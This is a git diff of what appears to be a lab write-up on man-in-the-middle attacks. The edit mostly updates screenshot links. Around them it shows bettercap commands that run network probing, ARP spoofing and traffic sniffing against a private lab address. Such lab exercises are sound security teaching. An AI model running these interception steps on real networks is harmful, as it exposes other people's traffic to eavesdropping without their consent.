@@ -34,7 +34,8 @@ A Man-in-the-Middle attack occurs when an attacker secretly intercepts communica
 ```bash
 ping 192.168.95.140
 ```
-![Ping screenshot]<img width="806" height="502" alt="image" src="https://github.com/user-attachments/assets/827fada1-5d03-4f54-a6cb-325c7c76f366" />
+![Ping screenshot]<img width="806" height="503" alt="Screenshot 2026-04-21 234608" src="https://github.com/user-attachments/assets/61240b36-faaf-4753-b148-e5c666b1b163" />
+
 
 
 ---
@@ -43,6 +44,7 @@ ping 192.168.95.140
 ```bash
 sudo bettercap -iface eth0
 ```
+<img width="1112" height="330" alt="image" src="https://github.com/user-attachments/assets/718f0de2-73e6-49f7-9563-41dfcb799ead" />
 
 ---
 
@@ -50,15 +52,22 @@ sudo bettercap -iface eth0
 ```bash
 net.probe on
 ```
-<img width="1847" height="912" alt="image" src="https://github.com/user-attachments/assets/d2fffcd4-0e13-4210-8116-6753b94562e5" />
+<img width="1847" height="912" alt="Screenshot 2026-04-21 235249" src="https://github.com/user-attachments/assets/e27d1086-bc8f-4b9e-acae-e712e6978b4b" />
 
 ```
 set arp.spoof.target 192.168.95.140 and arp.spoof on
 ```
-<img width="1372" height="473" alt="image" src="https://github.com/user-attachments/assets/5efe1d9a-3f4d-46e4-b4fb-e300aae7df00" />
+<img width="1373" height="474" alt="Screenshot 2026-04-21 235435" src="https://github.com/user-attachments/assets/d80bc5d9-85d7-4dde-838c-5424059d75b7" />
 
 ```
 net.sniff on
+```
+<img width="1821" height="352" alt="image" src="https://github.com/user-attachments/assets/b8f2416f-d813-4536-a320-fecefb5be8ff" />
+
+
+
+```
+ARP Spoofing
 ```
 <img width="1898" height="843" alt="Screenshot 2026-04-21 232114" src="https://github.com/user-attachments/assets/db50478f-f185-40df-bff7-5cf789e6abfc" />
 
